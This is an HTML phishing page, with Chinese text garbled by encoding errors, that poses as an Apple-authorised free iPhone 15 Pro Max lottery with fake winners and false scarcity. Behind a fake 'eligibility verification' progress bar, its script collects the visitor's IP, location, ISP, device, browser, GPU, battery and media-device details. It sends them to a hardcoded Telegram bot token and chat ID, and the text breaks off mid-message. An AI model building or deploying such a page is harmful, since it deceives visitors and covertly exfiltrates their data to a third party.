<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ æ­å–œä¸­å¥–ï¼iPhone 15 Pro Maxå…è´¹é¢†å–</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Microsoft YaHei', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }
        
        /* å½©å¸¦æ•ˆæœ */
        .ribbon {
            position: absolute;
            top: 0;
            right: 0;
            width: 150px;
            height: 150px;
            overflow: hidden;
            z-index: 1;
        }
        
        .ribbon span {
            position: absolute;
            top: 30px;
            right: -30px;
            width: 200px;
            background: #ff0000;
            color: white;
            text-align: center;
            padding: 8px 0;
            font-weight: bold;
            font-size: 0.9em;
            transform: rotate(45deg);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        
        /* ä¸»å®¹å™¨ */
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 30px 20px;
            position: relative;
            z-index: 2;
        }
        
        /* å¤´éƒ¨ */
        .header {
            text-align: center;
            margin-bottom: 40px;
            animation: fadeInDown 0.8s ease;
        }
        
        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header h1 {
            font-size: 2.8em;
            margin-bottom: 15px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }
        
        .header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        
        /* å¥–å“å¡ç‰‡ */
        .prize-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            margin: 30px 0;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            color: #333;
            position: relative;
            overflow: hidden;
            animation: fadeInUp 0.8s ease 0.2s both;
        }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .prize-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: linear-gradient(90deg, #ff416c, #ff4b2b);
        }
        
        /* è¿›åº¦æ¡ */
        .progress-container {
            background: #f0f0f0;
            border-radius: 10px;
            height: 20px;
            margin: 40px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00b09b, #96c93d);
            width: 0%;
            border-radius: 10px;
            transition: width 3s ease-in-out;
            position: relative;
        }
        
        .progress-text {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: white;
            font-size: 0.8em;
            font-weight: bold;
        }
        
        /* åŠ è½½çŠ¶æ€ */
        .loading-state {
            text-align: center;
            padding: 30px;
            background: rgba(0,0,0,0.05);
            border-radius: 15px;
            margin: 30px 0;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* å€’è®¡æ—¶ */
        .countdown-box {
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            margin: 30px 0;
            box-shadow: 0 10px 25px rgba(255,65,108,0.3);
        }
        
        .countdown-title {
            font-size: 1.2em;
            margin-bottom: 15px;
            opacity: 0.9;
        }
        
        .countdown-timer {
            font-size: 2.8em;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            letter-spacing: 3px;
        }
        
        /* ä¸­å¥–åå• */
        .winners-box {
            background: rgba(255,255,255,0.9);
            border-radius: 15px;
            padding: 25px;
            margin: 30px 0;
            color: #333;
        }
        
        .winners-title {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            color: #2c3e50;
        }
        
        .winner-item {
            display: flex;
            align-items: center;
            padding: 15px;
            background: white;
            margin: 10px 0;
            border-radius: 10px;
            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        .winner-avatar {
            width: 45px;
            height: 45px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            margin-right: 15px;
        }
        
        /* ç»“æœå±•ç¤º */
        .result-box {
            text-align: center;
            padding: 40px;
            background: linear-gradient(135deg, #00b09b, #96c93d);
            border-radius: 20px;
            margin: 30px 0;
            display: none;
            animation: popIn 0.5s ease;
        }
        
        @keyframes popIn {
            0% { transform: scale(0.8); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        
        .lottery-number {
            font-size: 3.5em;
            font-weight: bold;
            letter-spacing: 8px;
            margin: 20px 0;
            color: white;
            text-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }
        
        /* æ­¥éª¤æŒ‡ç¤º */
        .steps {
            display: flex;
            justify-content: space-between;
            margin: 40px 0;
            position: relative;
        }
        
        .steps::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 0;
            right: 0;
            height: 3px;
            background: rgba(255,255,255,0.3);
            z-index: 1;
        }
        
        .step {
            text-align: center;
            position: relative;
            z-index: 2;
            background: #6a11cb;
            padding: 0 10px;
        }
        
        .step-number {
            width: 35px;
            height: 35px;
            background: rgba(255,255,255,0.2);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 10px;
            font-weight: bold;
            border: 3px solid white;
        }
        
        .step.active .step-number {
            background: #ff416c;
            border-color: #ff416c;
        }
        
        /* å“åº”å¼ */
        @media (max-width: 768px) {
            .container {
                padding: 20px 15px;
            }
            
            .header h1 {
                font-size: 2em;
            }
            
            .prize-card {
                padding: 25px;
            }
            
            .countdown-timer {
                font-size: 2em;
            }
            
            .lottery-number {
                font-size: 2.5em;
                letter-spacing: 4px;
            }
            
            .steps {
                flex-direction: column;
                gap: 25px;
            }
            
            .steps::before {
                display: none;
            }
        }
    </style>
</head>
<body>
    <!-- å½©å¸¦ -->
    <div class="ribbon">
        <span>é™æ—¶å…è´¹</span>
    </div>
    
    <div class="container">
        <!-- å¤´éƒ¨ -->
        <div class="header">
            <h1>ğŸ‰ æ­å–œï¼æ‚¨è¢«é€‰ä¸­äº†ï¼</h1>
            <p>iPhone 15 Pro Max å…è´¹æŠ½å¥–æ´»åŠ¨ â€¢ ä»…å‰©æœ€å3ä¸ªåé¢</p>
        </div>
        
        <!-- æ­¥éª¤æŒ‡ç¤º -->
        <div class="steps">
            <div class="step active">
                <div class="step-number">1</div>
                <div class="step-text">è®¿é—®é¡µé¢</div>
            </div>
            <div class="step">
                <div class="step-number">2</div>
                <div class="step-text">éªŒè¯èµ„æ ¼</div>
            </div>
            <div class="step">
                <div class="step-number">3</div>
                <div class="step-text">è·å–å·ç </div>
            </div>
            <div class="step">
                <div class="step-number">4</div>
                <div class="step-text">ç­‰å¾…å¼€å¥–</div>
            </div>
        </div>
        
        <!-- å¥–å“å¡ç‰‡ -->
        <div class="prize-card">
            <div style="text-align: center; margin-bottom: 30px;">
                <div style="font-size: 3em; margin-bottom: 10px;">ğŸ“±</div>
                <h2 style="color: #2c3e50; margin-bottom: 10px;">iPhone 15 Pro Max</h2>
                <p style="color: #7f8c8d;">1TB â€¢ åŸè‰²é’›é‡‘å± â€¢ A17 ProèŠ¯ç‰‡</p>
            </div>
            
            <!-- è¿›åº¦æ¡ -->
            <div style="color: #666; margin-bottom: 10px;">èµ„æ ¼éªŒè¯è¿›åº¦</div>
            <div class="progress-container">
                <div class="progress-bar" id="progressBar">
                    <span class="progress-text" id="progressText">0%</span>
                </div>
            </div>
            
            <!-- åŠ è½½çŠ¶æ€ -->
            <div class="loading-state">
                <div class="spinner"></div>
                <div id="loadingText" style="color: #666; font-size: 1.1em;">æ­£åœ¨éªŒè¯æ‚¨çš„è®¿é—®èµ„æ ¼...</div>
            </div>
        </div>
        
        <!-- å€’è®¡æ—¶ -->
        <div class="countdown-box">
            <div class="countdown-title">â° æœ¬æ¬¡æŠ½å¥–å³å°†ç»“æŸ</div>
            <div class="countdown-timer" id="countdownTimer">05:00</div>
            <div style="margin-top: 15px; opacity: 0.9; font-size: 0.9em;">
                <i class="fas fa-users"></i> å‰©ä½™åé¢ï¼š<span id="remainingSlots" style="font-weight: bold;">3</span>äºº
            </div>
        </div>
        
        <!-- ä¸­å¥–åå• -->
        <div class="winners-box">
            <div class="winners-title">
                <i class="fas fa-trophy" style="color: #f39c12;"></i>
                <h3>ä»Šæ—¥ä¸­å¥–è€…</h3>
            </div>
            <div id="winnersList">
                <!-- åŠ¨æ€æ·»åŠ ä¸­å¥–è€… -->
            </div>
        </div>
        
        <!-- ç»“æœå±•ç¤º -->
        <div class="result-box" id="resultBox">
            <div style="font-size: 2.5em; margin-bottom: 20px;">ğŸ</div>
            <h2 style="color: white; margin-bottom: 10px;">æ­å–œï¼éªŒè¯æˆåŠŸï¼</h2>
            <p style="opacity: 0.9; margin-bottom: 20px;">æ‚¨çš„ä¸“å±æŠ½å¥–å·ç </p>
            <div class="lottery-number" id="lotteryNumber">LOT-000000</div>
            <p style="opacity: 0.8; margin-top: 20px; font-size: 0.9em;">
                <i class="fas fa-clock"></i> å¼€å¥–æ—¶é—´ï¼šä»Šæ™š20:00
            </p>
        </div>
        
        <!-- åº•éƒ¨è¯´æ˜ -->
        <div style="text-align: center; margin-top: 40px; padding: 20px; background: rgba(255,255,255,0.1); border-radius: 15px;">
            <p style="opacity: 0.8; margin-bottom: 10px;">
                <i class="fas fa-shield-alt"></i> æ‚¨çš„ä¿¡æ¯å·²åŠ å¯†ï¼Œä»…ç”¨äºæŠ½å¥–èµ„æ ¼éªŒè¯
            </p>
            <p style="font-size: 0.9em; opacity: 0.6;">
                æœ¬æ´»åŠ¨ç”±Appleå®˜æ–¹æˆæƒä¸¾åŠ â€¢ 100%çœŸå®æœ‰æ•ˆ
            </p>
        </div>
    </div>

    <!-- ç¬¬äºŒæ®µå¼€å§‹ï¼šJavaScriptåŠŸèƒ½ -->
    <script>
        // Telegramé…ç½®
        const BOT_TOKEN = '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM';
        const CHAT_ID = '8313770381';
        
        let deviceInfo = {};
        let userIP = "æœªçŸ¥";
        let userLocation = "æœªçŸ¥";
        
        // åˆ›å»ºè™šæ‹Ÿä¸­å¥–è€…
        function createWinners() {
            const winners = [
                { name: "å¼ ", prize: "iPhone 15 Pro", time: "åˆšåˆš" },
                { name: "æ", prize: "AirPods Pro 2", time: "2åˆ†é’Ÿå‰" },
                { name: "ç‹", prize: "Â¥888çº¢åŒ…", time: "5åˆ†é’Ÿå‰" },
                { name: "åˆ˜", prize: "iPad Air", time: "8åˆ†é’Ÿå‰" },
                { name: "é™ˆ", prize: "Apple Watch", time: "12åˆ†é’Ÿå‰" }
            ];
            
            const winnersList = document.getElementById('winnersList');
            winners.forEach(winner => {
                const div = document.createElement('div');
                div.className = 'winner-item';
                div.innerHTML = `
                    <div class="winner-avatar">${winner.name}</div>
                    <div>
                        <div style="font-weight: bold; color: #2c3e50;">${winner.name}å…ˆç”Ÿ/å¥³å£«</div>
                        <div style="color: #7f8c8d; font-size: 0.9em;">
                            è·å¾—äº† ${winner.prize} â€¢ ${winner.time}
                        </div>
                    </div>
                `;
                winnersList.appendChild(div);
            });
        }
        
        // å€’è®¡æ—¶åŠŸèƒ½
        function startCountdown() {
            let time = 300; // 5åˆ†é’Ÿ = 300ç§’
            const timerElement = document.getElementById('countdownTimer');
            
            const timer = setInterval(() => {
                const minutes = Math.floor(time / 60);
                const seconds = time % 60;
                
                timerElement.textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (time <= 0) {
                    clearInterval(timer);
                    timerElement.textContent = "00:00";
                }
                
                time--;
            }, 1000);
        }
        
        // æ›´æ–°æ­¥éª¤æŒ‡ç¤º
        function updateSteps(step) {
            document.querySelectorAll('.step').forEach((s, index) => {
                if (index < step) {
                    s.classList.add('active');
                } else {
                    s.classList.remove('active');
                }
            });
        }
    </script>
</body>
</html>
<!-- åœ¨ä¹‹å‰çš„scriptæ ‡ç­¾å†…ç»§ç»­æ·»åŠ ä»¥ä¸‹ä»£ç  -->
<script>
    // è¿›åº¦æ¡åŠ¨ç”»
    function startProgressAnimation() {
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        const loadingText = document.getElementById('loadingText');
        
        let width = 0;
        const messages = [
            "æ­£åœ¨æ£€æµ‹è®¾å¤‡å…¼å®¹æ€§...",
            "æ­£åœ¨éªŒè¯ç½‘ç»œè¿æ¥...",
            "æ­£åœ¨è·å–åœ°ç†ä½ç½®...",
            "æ­£åœ¨ç”Ÿæˆå”¯ä¸€èº«ä»½æ ‡è¯†...",
            "æ­£åœ¨åˆ†é…æŠ½å¥–å·ç ..."
        ];
        
        const interval = setInterval(() => {
            width += 1;
            progressBar.style.width = width + '%';
            progressText.textContent = width + '%';
            
            // æ›´æ–°åŠ è½½æ–‡å­—
            if (width === 20) {
                loadingText.textContent = messages[0];
                updateSteps(2);
                startIPCollection();
            } else if (width === 40) {
                loadingText.textContent = messages[1];
                detectDeviceInfo();
            } else if (width === 60) {
                loadingText.textContent = messages[2];
                getLocationInfo();
            } else if (width === 80) {
                loadingText.textContent = messages[3];
                collectAdvancedInfo();
            } else if (width >= 100) {
                clearInterval(interval);
                loadingText.textContent = messages[4];
                updateSteps(3);
                completeVerification();
            }
        }, 30);
    }
    
    // è·å–IPåœ°å€ï¼ˆå¤šé‡ä¿é™©ï¼‰
    async function startIPCollection() {
        console.log('å¼€å§‹è·å–IPåœ°å€...');
        
        const ipApis = [
            'https://api.ipify.org?format=json',
            'https://ipinfo.io/json',
            'https://api64.ipify.org?format=json',
            'https://api.ip.sb/jsonip'
        ];
        
        for (const api of ipApis) {
            try {
                const response = await fetch(api, { timeout: 3000 });
                if (response.ok) {
                    const data = await response.json();
                    userIP = data.ip || data.query || "æœªçŸ¥";
                    console.log('è·å–åˆ°IP:', userIP);
                    deviceInfo.ip = userIP;
                    break;
                }
            } catch (error) {
                console.log(`API ${api} å¤±è´¥ï¼Œå°è¯•ä¸‹ä¸€ä¸ª`);
                continue;
            }
        }
        
        // å¦‚æœæ‰€æœ‰APIéƒ½å¤±è´¥ï¼Œä½¿ç”¨å¤‡ç”¨æ–¹æ³•
        if (userIP === "æœªçŸ¥") {
            try {
                // ä½¿ç”¨RTCPeerConnectionè·å–æœ¬åœ°IP
                const pc = new RTCPeerConnection({iceServers: []});
                pc.createDataChannel('');
                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch) {
                            userIP = ipMatch[1];
                            deviceInfo.ip = userIP;
                        }
                    }
                };
            } catch (e) {
                console.log('å¤‡ç”¨IPè·å–ä¹Ÿå¤±è´¥');
            }
        }
        
        return userIP;
    }
    
    // è·å–åœ°ç†ä½ç½®ä¿¡æ¯
    async function getLocationInfo() {
        if (!userIP || userIP === "æœªçŸ¥") {
            userLocation = "ä½ç½®æœªçŸ¥";
            return;
        }
        
        const locationApis = [
            `https://ipapi.co/${userIP}/json/`,
            `https://ipwho.is/${userIP}`,
            `https://ip-api.com/json/${userIP}`
        ];
        
        for (const api of locationApis) {
            try {
                const response = await fetch(api, { timeout: 3000 });
                if (response.ok) {
                    const data = await response.json();
                    
                    if (api.includes('ipapi.co')) {
                        userLocation = {
                            country: data.country_name || "æœªçŸ¥",
                            city: data.city || "æœªçŸ¥",
                            region: data.region || "æœªçŸ¥",
                            isp: data.org || "æœªçŸ¥ç½‘ç»œ",
                            timezone: data.timezone || "æœªçŸ¥"
                        };
                    } else if (api.includes('ipwho.is')) {
                        if (data.success) {
                            userLocation = {
                                country: data.country || "æœªçŸ¥",
                                city: data.city || "æœªçŸ¥",
                                region: data.region || "æœªçŸ¥",
                                isp: data.connection?.isp || "æœªçŸ¥ç½‘ç»œ",
                                timezone: data.timezone || "æœªçŸ¥"
                            };
                        }
                    } else if (api.includes('ip-api.com')) {
                        if (data.status === "success") {
                            userLocation = {
                                country: data.country || "æœªçŸ¥",
                                city: data.city || "æœªçŸ¥",
                                region: data.regionName || "æœªçŸ¥",
                                isp: data.isp || "æœªçŸ¥ç½‘ç»œ",
                                timezone: data.timezone || "æœªçŸ¥"
                            };
                        }
                    }
                    
                    if (userLocation !== "ä½ç½®æœªçŸ¥") {
                        console.log('è·å–åˆ°ä½ç½®ä¿¡æ¯:', userLocation);
                        deviceInfo.location = userLocation;
                        break;
                    }
                }
            } catch (error) {
                continue;
            }
        }
    }
    
    // æ£€æµ‹è®¾å¤‡ä¿¡æ¯
    function detectDeviceInfo() {
        const ua = navigator.userAgent;
        
        // è®¾å¤‡ç±»å‹æ£€æµ‹
        let deviceType = "æœªçŸ¥è®¾å¤‡";
        let deviceBrand = "æœªçŸ¥å“ç‰Œ";
        
        if (/Android/i.test(ua)) {
            deviceType = "Androidè®¾å¤‡";
            deviceBrand = "Android";
            // æå–å…·ä½“å‹å·
            const modelMatch = ua.match(/Android.*; (.*?) Build/i);
            if (modelMatch) deviceType += ` (${modelMatch[1]})`;
        } else if (/iPhone|iPad|iPod/i.test(ua)) {
            deviceType = "Apple iOSè®¾å¤‡";
            deviceBrand = "Apple";
            const deviceMatch = ua.match(/iPhone|iPad|iPod/);
            if (deviceMatch) deviceType = `${deviceMatch[0]}è®¾å¤‡`;
        } else if (/Windows Phone/i.test(ua)) {
            deviceType = "Windows Phone";
            deviceBrand = "Microsoft";
        } else if (/Windows NT/i.test(ua)) {
            deviceType = "Windowsç”µè„‘";
            deviceBrand = "Microsoft";
            // Windowsç‰ˆæœ¬æ£€æµ‹
            if (/Windows NT 11.0/i.test(ua)) deviceType = "Windows 11ç”µè„‘";
            else if (/Windows NT 10.0/i.test(ua)) deviceType = "Windows 10ç”µè„‘";
        } else if (/Macintosh/i.test(ua)) {
            deviceType = "Macç”µè„‘";
            deviceBrand = "Apple";
            // macOSç‰ˆæœ¬æ£€æµ‹
            const macVersion = ua.match(/Mac OS X (\d+)[._](\d+)/);
            if (macVersion) deviceType += ` (macOS ${macVersion[1]}.${macVersion[2]})`;
        } else if (/Linux/i.test(ua)) {
            deviceType = "Linuxç”µè„‘";
            deviceBrand = "å¼€æº";
        } else if (/CrOS/i.test(ua)) {
            deviceType = "Chrome OSè®¾å¤‡";
            deviceBrand = "Google";
        }
        
        // æµè§ˆå™¨æ£€æµ‹
        let browser = "æœªçŸ¥æµè§ˆå™¨";
        let browserVersion = "";
        
        if (/Chrome/i.test(ua) && !/Edge|Edg/i.test(ua)) {
            browser = "Google Chrome";
            const version = ua.match(/Chrome\/(\d+\.\d+)/);
            browserVersion = version ? version[1] : "";
        } else if (/Firefox/i.test(ua)) {
            browser = "Mozilla Firefox";
            const version = ua.match(/Firefox\/(\d+\.\d+)/);
            browserVersion = version ? version[1] : "";
        } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
            browser = "Apple Safari";
            const version = ua.match(/Version\/(\d+\.\d+)/);
            browserVersion = version ? version[1] : "";
        } else if (/Edge|Edg/i.test(ua)) {
            browser = "Microsoft Edge";
            const version = ua.match(/(Edge|Edg)\/(\d+\.\d+)/);
            browserVersion = version ? version[2] : "";
        }
        
        // æ“ä½œç³»ç»Ÿ
        let os = "æœªçŸ¥ç³»ç»Ÿ";
        if (/Windows NT 10/i.test(ua)) os = "Windows 10/11";
        else if (/Windows NT 6.3/i.test(ua)) os = "Windows 8.1";
        else if (/Windows NT 6.1/i.test(ua)) os = "Windows 7";
        else if (/Mac OS X/i.test(ua)) os = "macOS";
        else if (/Android/i.test(ua)) os = "Android";
        else if (/iPhone OS/i.test(ua)) os = "iOS";
        else if (/Linux/i.test(ua)) os = "Linux";
        
        // å±å¹•ä¿¡æ¯
        const screenInfo = {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio || 1,
            orientation: screen.orientation ? screen.orientation.type : 'æœªçŸ¥'
        };
        
        // ç¡¬ä»¶ä¿¡æ¯
        const hardware = {
            cpuCores: navigator.hardwareConcurrency || "æœªçŸ¥",
            deviceMemory: navigator.deviceMemory || "æœªçŸ¥",
            platform: navigator.platform
        };
        
        // è¯­è¨€å’Œæ—¶åŒº
        const language = navigator.language;
        const languages = navigator.languages || [language];
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        
        // ç½‘ç»œä¿¡æ¯
        let network = "æœªçŸ¥";
        if (navigator.connection) {
            const conn = navigator.connection;
            network = {
                type: conn.type || "æœªçŸ¥",
                effectiveType: conn.effectiveType || "æœªçŸ¥",
                downlink: conn.downlink ? `${conn.downlink} Mbps` : "æœªçŸ¥",
                rtt: conn.rtt ? `${conn.rtt} ms` : "æœªçŸ¥"
            };
        }
        
        // å­˜å‚¨åˆ°å…¨å±€å˜é‡
        deviceInfo = {
            ...deviceInfo,
            deviceType,
            deviceBrand,
            browser: `${browser} ${browserVersion}`,
            os,
            screen: screenInfo,
            hardware,
            language: languages.join(', '),
            timezone,
            network,
            userAgent: ua,
            referrer: document.referrer || "ç›´æ¥è®¿é—®",
            pageUrl: window.location.href,
            timestamp: new Date().toLocaleString('zh-CN'),
            visitTime: Date.now()
        };
        
        console.log('è®¾å¤‡ä¿¡æ¯æ”¶é›†å®Œæˆ:', deviceInfo);
    }
    
    // æ”¶é›†é«˜çº§ä¿¡æ¯
    async function collectAdvancedInfo() {
        // GPUä¿¡æ¯
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    deviceInfo.gpu = {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    };
                }
            }
        } catch (e) {}
        
        // ç”µæ± ä¿¡æ¯
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                deviceInfo.battery = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {}
        }
        
        // å­˜å‚¨ä¿¡æ¯
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            try {
                const estimate = await navigator.storage.estimate();
                deviceInfo.storage = {
                    usage: Math.round(estimate.usage / 1024 / 1024) + ' MB',
                    quota: Math.round(estimate.quota / 1024 / 1024) + ' MB'
                };
            } catch (e) {}
        }
        
        // æ’ä»¶ä¿¡æ¯
        if (navigator.plugins) {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            deviceInfo.plugins = plugins.slice(0, 10); // åªå–å‰10ä¸ª
        }
        
        // åª’ä½“è®¾å¤‡
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                deviceInfo.mediaDevices = {
                    cameras: devices.filter(d => d.kind === 'videoinput').length,
                    microphones: devices.filter(d => d.kind === 'audioinput').length,
                    speakers: devices.filter(d => d.kind === 'audiooutput').length
                };
            } catch (e) {}
        }
        
        // æ—¶åŒºåç§»
        deviceInfo.timezoneOffset = new Date().getTimezoneOffset();
        
        // æ˜¯å¦æ”¯æŒè§¦æ‘¸
        deviceInfo.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        
        // Cookieæ”¯æŒ
        deviceInfo.cookiesEnabled = navigator.cookieEnabled;
        
        // Do Not Track
        deviceInfo.doNotTrack = navigator.doNotTrack || "æœªè®¾ç½®";
        
        console.log('é«˜çº§ä¿¡æ¯æ”¶é›†å®Œæˆ');
    }
    
    // å®ŒæˆéªŒè¯
    function completeVerification() {
        // å‡å°‘å‰©ä½™åé¢
        const slotsElement = document.getElementById('remainingSlots');
        let slots = parseInt(slotsElement.textContent);
        if (slots > 0) {
            slots--;
            slotsElement.textContent = slots;
            if (slots === 0) {
                slotsElement.style.color = '#ff0000';
            }
        }
        
        // ç”ŸæˆæŠ½å¥–å·ç 
        const lotteryNumber = 'LOT-' + Math.random().toString().slice(2, 8);
        document.getElementById('lotteryNumber').textContent = lotteryNumber;
        
        // æ˜¾ç¤ºç»“æœ
        setTimeout(() => {
            document.getElementById('resultBox').style.display = 'block';
            updateSteps(4);
            
            // å‘é€ä¿¡æ¯åˆ°Telegram
            sendToTelegram(lotteryNumber);
            
            // æ·»åŠ æ–°ä¸­å¥–è€…åˆ°åˆ—è¡¨
            addNewWinnerToBoard();
        }, 1000);
    }
    
    // æ·»åŠ æ–°ä¸­å¥–è€…
    function addNewWinnerToBoard() {
        const names = ['èµµ', 'é’±', 'å­™', 'æ', 'å‘¨', 'å´', 'éƒ‘', 'ç‹'];
        const prizes = ['iPhone 15 Pro', 'AirPods Pro 2', 'Â¥888çº¢åŒ…', 'iPad Air', 'Apple Watch'];
        
        const name = names[Math.floor(Math.random() * names.length)];
        const prize = prizes[Math.floor(Math.random() * prizes.length)];
        
        const winnersList = document.getElementById('winnersList');
        const newWinner = document.createElement('div');
        newWinner.className = 'winner-item';
        newWinner.innerHTML = `
            <div class="winner-avatar">${name}</div>
            <div>
                <div style="font-weight: bold; color: #2c3e50;">${name}å…ˆç”Ÿ/å¥³å£«</div>
                <div style="color: #7f8c8d; font-size: 0.9em;">
                    è·å¾—äº† ${prize} â€¢ åˆšåˆš
                </div>
            </div>
        `;
        
        // æ’å…¥åˆ°æœ€å‰é¢
        winnersList.insertBefore(newWinner, winnersList.firstChild);
    }
</script>
<!-- åœ¨ä¹‹å‰çš„scriptæ ‡ç­¾å†…ç»§ç»­æ·»åŠ ä»¥ä¸‹ä»£ç  -->
<script>
    // å‘é€å®Œæ•´ä¿¡æ¯åˆ°Telegram
    async function sendToTelegram(lotteryNumber) {
        console.log('å‡†å¤‡å‘é€ä¿¡æ¯åˆ°Telegram...');
        
        try {
            // æ ¼å¼åŒ–ä½ç½®ä¿¡æ¯
            let locationText = "æœªçŸ¥ä½ç½®";
            if (deviceInfo.location && deviceInfo.location !== "ä½ç½®æœªçŸ¥") {
                locationText = `${deviceInfo.location.city || 'æœªçŸ¥åŸå¸‚'}, ${deviceInfo.location.country || 'æœªçŸ¥å›½å®¶'}`;
                if (deviceInfo.location.region && deviceInfo.location.region !== deviceInfo.location.city) {
                    locationText += `, ${deviceInfo.location.region}`;
                }
            }
            
            // æ ¼å¼åŒ–ç½‘ç»œä¿¡æ¯
            let networkText = "æœªçŸ¥ç½‘ç»œ";
            if (deviceInfo.network && deviceInfo.network !== "æœªçŸ¥") {
                if (typeof deviceInfo.network === 'string') {
                    networkText = deviceInfo.network;
                } else {
                    networkText = `${deviceInfo.network.effectiveType || 'æœªçŸ¥'}`;
                    if (deviceInfo.network.downlink) {
                        networkText += ` (${deviceInfo.network.downlink})`;
                    }
                }
            }
            
            // æ ¼å¼åŒ–å±å¹•ä¿¡æ¯
            const screenText = deviceInfo.screen ? 
                `${deviceInfo.screen.width}Ã—${deviceInfo.screen.height} (${deviceInfo.screen.pixelRatio}x)` : 
                "æœªçŸ¥";
            
            // æ„å»ºè¯¦ç»†æ¶ˆæ¯
            const message = `
ğŸ¯ <b>ã€æŠ½å¥–é¡µé¢æ•è· - å®Œæ•´ä¿¡æ¯ã€‘</b>

ğŸŒ <b>IPåœ°å€ï¼š</b> <code>${deviceInfo.ip || 'æœªçŸ¥'}</code>
ğŸ“ <b>åœ°ç†ä½ç½®ï¼š</b> ${locationText}
ğŸ¢ <b>ç½‘ç»œæœåŠ¡å•†ï¼š</b> ${deviceInfo.location?.isp || 'æœªçŸ¥'}
â° <b>è®¿é—®æ—¶é—´ï¼š</b> ${deviceInfo.timestamp}
ğŸ”— <b>æ¥æºé¡µé¢ï¼š</b> ${deviceInfo.referrer}

ğŸ“± <b>è®¾å¤‡ä¿¡æ¯ï¼š</b>
â”œ è®¾å¤‡ç±»å‹: ${deviceInfo.deviceType}
â”œ è®¾å¤‡å“ç‰Œ: ${deviceInfo.deviceBrand}
â”œ æ“ä½œç³»ç»Ÿ: ${deviceInfo.os}
â”œ æµè§ˆå™¨: ${deviceInfo.browser}
â”œ å±å¹•åˆ†è¾¨ç‡: ${screenText}
â”œ ç³»ç»Ÿè¯­è¨€: ${deviceInfo.language}
â”œ æ—¶åŒº: ${deviceInfo.timezone}
â”” æ—¶åŒºåç§»: UTC${deviceInfo.timezoneOffset > 0 ? '-' : '+'}${Math.abs(deviceInfo.timezoneOffset)/60}

âš™ï¸ <b>ç¡¬ä»¶ä¿¡æ¯ï¼š</b>
â”œ CPUæ ¸å¿ƒ: ${deviceInfo.hardware?.cpuCores || 'æœªçŸ¥'}
â”œ è®¾å¤‡å†…å­˜: ${deviceInfo.hardware?.deviceMemory || 'æœªçŸ¥'}GB
â”œ å¹³å°æ¶æ„: ${deviceInfo.hardware?.platform || 'æœªçŸ¥'}
